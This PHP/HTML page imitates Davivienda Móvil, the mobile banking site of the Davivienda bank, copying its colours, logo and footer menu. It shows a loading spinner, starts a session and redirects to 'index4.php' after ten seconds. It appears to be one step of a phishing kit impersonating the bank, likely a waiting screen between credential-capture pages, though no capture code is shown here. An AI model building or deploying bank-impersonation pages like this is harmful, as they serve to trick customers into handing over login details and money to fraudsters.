<?php session_start(); ?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Davivienda Móvil - Cargando</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to bottom, rgba(237, 28, 39, 1) 40%, #f2f2f2 40%);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }

    .container {
      width: 90%;
      max-width: 360px;
      background: #ffffff;
      border-radius: 16px;
      box-shadow: 0 6px 14px rgba(0, 0, 0, 0.2);
      padding: 2rem 1.5rem;
      box-sizing: border-box;
      margin-bottom: 80px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 2rem;
    }

    .logo img {
      height: 35px;
    }

    .loading-spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #d90000;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 1.5rem;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      font-size: 1rem;
      color: #444;
      text-align: center;
    }

    .footer-menu {
      position: fixed;
      bottom: 0;
      width: 100%;
      max-width: 360px;
      background-color: #fff;
      display: flex;
      justify-content: space-between;
      border-top: 1px solid #ccc;
      padding: 0.4rem 0;
      z-index: 10;
    }

    .footer-item {
      flex: 1;
      text-align: center;
      font-size: 0.7rem;
      color: #000;
      padding: 0.2rem;
    }

    .footer-item img {
      width: 22px;
      height: 22px;
      display: block;
      margin: 0 auto 0.2rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="logo.png" alt="Davivienda Logo" />
    </div>

    <div class="loading-spinner"></div>
  </div>

  <!-- Footer -->
  <div class="footer-menu">
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/2989/2989988.png" alt="Productos" />
      <span>Abrir productos<br>en Línea</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/847/847969.png" alt="Registrarse" />
      <span>Registrarse</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/2462/2462719.png" alt="Atención" />
      <span>Atención en<br>Línea</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/535/535239.png" alt="Agencias" />
      <span>Agencias y<br>Cajeros</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/512/512222.png" alt="Más" />
      <span>Más...</span>
    </div>
  </div>

  <script>
    setTimeout(function () {
      window.location.href = "index4.php"; // Cambia esta URL por la que necesites
    }, 10000);
  </script>
</body>
</html>
